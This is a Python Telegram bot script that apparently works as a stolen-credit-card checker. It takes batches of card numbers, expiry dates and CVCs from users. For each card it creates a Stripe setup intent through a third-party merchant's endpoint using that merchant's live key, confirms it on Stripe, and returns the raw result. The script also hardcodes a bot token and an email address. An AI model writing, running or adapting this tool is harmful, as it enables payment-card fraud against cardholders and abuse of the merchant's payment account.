
import requests

# Your Telegram bot token
BOT_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(BOT_TOKEN)

# Stripe public key (replace with your actual key if needed)
stripe_publishable_key = 'pk_live_51IksXdLsdufqQtEPrF9bXcJSrESLkgnbnfldl87Y1B20yq8lVkogGvYx5jpEduPg2CDuQ1E15IQzaaIRExFp0xkL001gqjnUZQ'

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Welcome! Use /check to check your credit card.")

@bot.message_handler(commands=['check'])
def check_card(message):
    bot.send_message(message.chat.id,
        "Enter your card details in this format:\nNumber, Month, Year, CVC\nExample:\n4242424242424242, 12, 2024, 123")
    bot.register_next_step_handler(message, process_cards)

def process_cards(message):
    lines = message.text.strip().splitlines()
    results = []
    for line in lines:
        parts = line.split(',')
        if len(parts) != 4:
            results.append(f"Invalid format: {line}")
            continue
        card_number = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvc = parts[3].strip()

        # Step 1: Create Setup Intent
        create_response = requests.post(
            'https://cinemamastery.com/api/non_oauth/stripe_intents/setup_intents/create',
            headers={
                'Content-Type': 'application/json',
                'accept': 'application/json'
            },
            json={
                'page_id': 'ZCtvdkFwV0ZBb2J1ZEpEOUw2YlRrQT09LS1tOFh1YXFEMWZlVEp5MGhPRnFRb2JnPT0=--06eb28a5479ac90f95675383388a8be1ecb4e0bc',
                'stripe_publishable_key': stripe_publishable_key,
                'stripe_account_id': 'acct_1IksXdLsdufqQtEP'
            }
        )
        setup_json = create_response.json()
        seti_id = setup_json.get('id')
        if not seti_id:
            results.append(f"Failed to get seti_ ID for card {card_number}")
            continue

        # Step 2: Confirm the setup intent with card details
        confirm_response = requests.post(
            f'https://api.stripe.com/v1/setup_intents/{seti_id}',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'accept': 'application/json'
            },
            data={
                'payment_method_data[type]': 'card',
                'payment_method_data[billing_details][email]': 'Peshangkrisp9@gmail.com',
                'payment_method_data[card][number]': card_number,
                'payment_method_data[card][cvc]': cvc,
                'payment_method_data[card][exp_month]': exp_month,
                'payment_method_data[card][exp_year]': exp_year
            }
        )
        full_response = confirm_response.text
        results.append(f"Card {card_number} response:\n{full_response}")
    # Send all results back
    bot.send_message(message.chat.id, "\n\n".join(results))

bot.polling()